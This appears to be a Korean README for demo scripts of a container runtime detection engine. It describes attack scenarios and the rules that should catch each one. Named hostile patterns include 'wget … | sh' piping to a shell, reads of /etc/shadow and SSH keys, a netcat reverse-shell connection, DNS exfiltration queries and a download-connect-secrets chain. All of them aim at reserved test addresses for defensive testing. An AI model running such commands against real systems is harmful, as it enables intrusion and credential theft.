# 데모 컨테이너

EC2·sg-vm(가젯 소스)에서 탐지·격리를 눈으로 확인하는 스크립트. 로컬 macOS 에서는 `EVENT_SOURCE=mock` 이
같은 시나리오를 대신 재생하므로 이 스크립트는 필요 없다.

| 스크립트 | 컨테이너 | 하는 일 |
| --- | --- | --- |
| `run-victim.sh` | `victim` | 2초마다 `cat`·`wget example.com` — 정상 이벤트 기준선 |
| `run-attacker.sh` | `pkg-reqeusts` | 아래 공격 시나리오 실행(`SCENARIO`, 기본 `all`). `LOOP=1` 이면 10초마다 반복, `DRY=1` 이면 docker 인자만 출력 |
| `cleanup.sh` | | 위 컨테이너 제거 |

## 공격 시나리오

`run-attacker.sh` 는 `SCENARIO=all|shell|revshell|direct-ip|domain|dns-exfil|udp|chain` 로 고른다(`chain` 은 `all` 에 없다 — 따로만). 시나리오마다 컨테이너를
따로 띄우고 **그 시나리오의 코드만** 넘긴다(`all` 은 아래 순서로 하나씩). 한 덩어리로 넘기면 컨테이너 PID1 인자에
다른 시나리오의 문자열이 섞여 엉뚱한 규칙에 먼저 걸리기 때문이다. 확인: `DRY=1 SCENARIO=domain bash run-attacker.sh`.

설치 샌드박스용 `reqeusts/setup.py` 는 같은 시나리오를 `SG_DEMO_SCENARIOS`(쉼표 구분, 기본 `all`)로 고른다.
각 시나리오는 시작 시 `[demo] <id> start` 를 찍어 이벤트 시각을 맞출 수 있다.

| id | 이미지 | 행위 | 걸리는 규칙 | 기대 판정 | 확인 방법 |
| --- | --- | --- | --- | --- | --- |
| `shell` | busybox | `wget … \| sh` 외부 스크립트 실행 패턴 + `/etc/shadow`·`/root/.ssh/id_rsa` 열기 시도 | `no-shell-download`·`pipe-to-shell`·`sensitive-files` (샌드박스는 `sandbox-secrets`) | **kill** | 이벤트 화면 위반 / 감사 로그 규칙 필터 |
| `revshell` | busybox | `nc 203.0.113.7 4444` TCP | `reverse-shell-ports` + `no-shell-download`(nc) — 함께 걸리는 게 의도 | **kill** | 감사 로그 `reverse-shell-ports` 필터 |
| `direct-ip` | python | DNS 없이 `203.0.113.7:443` TCP | 런타임 `runtime-direct-ip` / 샌드박스 `sandbox-egress` | 런타임 **alert** · 샌드박스 **kill** | 이벤트 화면 「IP 직접 연결」 |
| `domain` | python | `example.com:443` TCP (실제로 해석됨 → 목적지 도메인 표시) | `blocklist-hosts`(차단 목록 도메인) | 차단 목록에 `example.com` 을 올린 뒤 **kill** · 올리기 전 **정상 통과**(443 허용) | 이벤트 화면 목적지 도메인 / 감사 로그 `blocklist-hosts` 필터 |
| `dns-exfil` | python | 48자 hex 라벨 `….exfil.example` A 질의 + `data.exfil.example` TXT 질의(예약 TLD, NXDOMAIN — 데이터는 나가지 않음) | 런타임 `runtime-dns-exfil` / 샌드박스 `sandbox-dns`(시험 운영) | 런타임 **alert ×2**(A 질의 라벨 48자 · TXT) · 샌드박스 **격리 대상**(dryRun) | 이벤트 화면 종류 `dns`(도메인 조회) / 감사 로그 `kind=dns` 필터 |
| `udp` | python | `203.0.113.7:53`·`:4444` UDP 2개(응답 안 기다림) | 없음 — 엔진은 TCP 와 DNS(53 · 5353)만 관찰 | **미탐**(음성 대조군) | 이벤트 화면에 **뜨지 않음**을 확인 |
| `chain` | busybox | wget 실행 → `203.0.113.7:80` 연결 시도 → 1초 뒤 없는 `/root/.netrc` 열기 시도(10초 창 안). `CHAIN_GAP=11` 이면 마지막 단계를 11초 늦춘 음성 대조군 | 연쇄 `chain-download-secrets`(시험 운영) — 단, 기본 `no-shell-download`(kill)가 wget 에서 먼저 격리하므로 **그 규칙을 dryRun 으로 둔 상태에서** | wget 은 `no-shell-download`(dryRun 이면 격리 대상) · 연결은 `runtime-direct-ip` 경고 · 파일 열기는 **연쇄 격리 대상**(사유에 단계와 경과 초) / `CHAIN_GAP=11` 은 연쇄 **미탐** | 감사 로그 상세의 「연쇄」 행 · 정책 화면 「연쇄」 배지 |

- `domain`: 정책 화면에서 차단 목록(도메인)에 `example.com` 을 올린 뒤 실행하면 `blocklist-hosts` 로 kill 된다.
  올리기 전에는 443 이 허용 포트라 정상 통과한다. example.com 은 IANA 문서용 예약 도메인이고 접속만 하고 데이터는 보내지 않는다.
- `dns-exfil`: 질의만 보고 판정한다(응답은 리졸버 캐시에만). 런타임은 `runtime-dns-exfil` 로 경고 2건(A 질의 라벨 48자 > 40 · TXT 질의), 샌드박스(`sg-install pip ./reqeusts`)는 `sandbox-dns` 가 허용 목록 밖 도메인으로 잡되 시험 운영(dryRun)이라 **격리 대상**으로만 표시한다. 도메인 판단(`RESOLVE_DNS`)이 꺼져 있으면 dns 이벤트 자체가 없어 걸리지 않는다.
- `udp`: 엔진이 일반 UDP 를 보지 못한다는 한계(TCP 와 DNS 53 · 5353 만 관찰)를 보여 주는 **음성 대조군**이다. 이벤트에 나타나지 않는 것이 정상이다.
- `chain`: 하나씩은 약한 신호(다운로더 실행 · 외부 연결 · 없는 파일 열기)가 같은 컨테이너에서 10초 안에 이어지면 연쇄 규칙이 잡는다는 것을 보인다. `/root/.netrc` 는 런타임 단일 규칙(`sensitive-files`)에 없는 경로라 연쇄만 잡는다. 판정은 이벤트 1건에 1개 — 파일 열기 이벤트 한 줄에 연쇄가 붙는다(11/04).
- 타이밍: TEST-NET 목적지(`203.0.113.0/24`)는 접속이 실패할 때(타임아웃 약 3초 뒤) connect 이벤트가 나오므로
  격리도 그 뒤에 일어난다. 실제로 도달 가능한 서버(example.com 등)면 즉시 나온다.

목적지는 RFC 5737 TEST-NET 과 IANA 예약 도메인 `example.com` · 예약 TLD `*.example`(RFC 2606) 뿐이다. 실제 악성 코드·실데이터는 없다.

## 대시보드 시연(`POST /api/demo/run`, `DEMO_ENABLED=true`)

시연 서비스는 위 시나리오를 `sg-install-demo-<unix>` 컨테이너(설치 세션)로 재현한다. 시나리오 `all|shell|revshell|direct-ip|domain|dns-exfil` 은
`reqeusts` 를 pip 로 설치하고, 11/04 부터 아래가 더 있다(둘 다 `all` 에는 없다).

| id | 패키지 · 이미지 | 행위 | 기대 판정(기본 정책) |
| --- | --- | --- | --- |
| `benign` | `sg-demo-benign` · python:3.12-slim | 정상 설치 대조군 — 순수 파이썬 모듈 하나, setuptools 빌드만(pip 가 pypi.org · files.pythonhosted.org 에서 빌드 도구를 받는다) | **위반 0 · 통과** |

`sg-demo-benign` 은 `reqeusts` 와 다른 패키지라 `pip:reqeusts` 가 차단 목록에 있어도 거부되지 않는다.

## 판정 끄고 전부 보기

`ENFORCE_KILL=true` 면 각 시나리오가 첫 위반에서 종료된다. 판정만 보고 싶으면 대시보드 정책 화면에서 해당 정책을
dry-run 으로 바꾸거나 `.env` 의 `ENFORCE_KILL=false` 로 전역 dry-run 을 켠다.
